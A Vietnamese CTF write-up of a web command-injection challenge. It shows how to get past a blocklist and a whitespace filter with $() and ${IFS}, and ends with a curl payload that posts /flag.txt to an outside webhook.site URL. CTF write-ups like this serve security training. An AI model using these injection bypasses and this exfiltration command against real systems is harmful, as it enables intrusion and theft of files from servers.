---
title: Write-Up The Existed File
date: 2023-10-01 12:44:01 +0700
categories: [CTF, Cookie Hân Hoan, Write-Up]
tags: [web, write-up, ctf]     # TAG names should always be lowercase
---
# The Existed File
The system will check whether the file exists or not. We have also implemented blocklist keywords to detect hackers.
## **Tổng quan**

- Để giải được challenge này, ta cần vận dụng kiến thức về Command Injection cũng như cách dùng các lệnh như curl, wget và biến ${IFS}
- công cụ: Burpsuite, Webhook

## Phân tích bài

- Truy cập vào web ta thấy web chỉ có chức năng kiểm tra xem liệu đường dẫn thư mục có tồn tại hay không, nếu có trả về như ảnh.

<img src="/assets/writeup/cookie/The Existed File/0.png">
- Kiểm tra mã nguồn ta thấy được trang web đã filter 1 số câu lệnh

<img src="/assets/writeup/cookie/The Existed File/1.png">

- Ta tiếp tục nhận thấy ở trong đoạn code, biến file_path đang là 1 untrusted data không được kiểm soát và có vẻ như nó sẽ thực thi bất kì câu lệnh nào ta nhập vào, tuy nhiên ở đây bài này đã filter đi khoảng trắng.

<img src="/assets/writeup/cookie/The Existed File/2.png">

Dòng mã **`file_path.translate({ord(c): None for c in string.whitespace})`** loại bỏ tất cả khoảng trắng trong biến `**file_path**` ta nhập vào

<img src="/assets/writeup/cookie/The Existed File/3.png">

Dòng mã **`subprocess.check_output(command, shell=True)`** đang thực hiện lệnh hệ thống trực tiếp từ dữ liệu người dùng. Điều này có thể tạo lỗ hổng command injection

- Lúc này ta bắt đầu khai thác, trang web đã chặn những chức năng nối dài câu lệnh như `; & |` tuy nhiên như vậy là chưa đủ.

Có một số ký tự và lệnh khác trong Linux có thể được sử dụng để nối chuỗi các lệnh, bao gồm:

- `||`: Toán tử OR trong Linux có thể nối 2 lệnh với nhau, lệnh thứ 2 sẽ chạy nếu lệnh thứ 1 thất bại.
- `&&`: Toán tử AND trong Linux có thể nối 2 lệnh, lệnh thứ 2 chỉ chạy khi lệnh thứ 1 thành công.
- `$()`: Dùng để thực thi lệnh bên trong và thay thế bằng kết quả.
- `\`: Dấu gạch chéo ngược dùng để chia nhỏ lệnh dài thành nhiều dòng.
- `$IFS`: Biến môi trường Internal Field Separator có thể được sử dụng để ngăn cách các lệnh.
- `exec`: Lệnh exec có thể được dùng để thực thi lệnh tiếp theo mà không cần tạo tiến trình con mới.

Ở bài này mình sẽ sử dụng biến $() để nối dài câu lệnh, tuy nhiên khi mình test với payload sau thì không trả ra được output gì.

<img src="/assets/writeup/cookie/The Existed File/4.png">

- Có vẻ như câu lệnh vẫn được thực thi, tuy nhiên ở bài này sẽ không trả ra output khác, vì vậy mình thử sử dụng curl để kiểm tra xem, ở đây mình dùng `${IFS}` để bypass filter khoảng trắng

<img src="/assets/writeup/cookie/The Existed File/5.png">

- như bạn thấy, server vẫn trả về kết quả là file không tồn tại, tuy nhiên sang webhook thì ta có thể thấy được rằng ta có thể gửi tín hiệu ra ngoài ^^

<img src="/assets/writeup/cookie/The Existed File/6.png">

- sử dụng payload sau để lấy flag

payload: `$(curl${IFS}-X${IFS}POST${IFS}--data-binary${IFS}"@/flag.txt"${IFS}[https://webhook.site/a7b67a78-da14-4fa4-8c4a-fe87957f4be1](https://webhook.site/a7b67a78-da14-4fa4-8c4a-fe87957f4be1))`

mẫu: `curl -X POST --data-binary "@/path/to/flag.txt" webhook của bạn`

- ở đây bạn thay thế khoảng trắng bằng `${IFS}` và đường dẫn bằng `/flag.txt`

<img src="/assets/writeup/cookie/The Existed File/7.png">
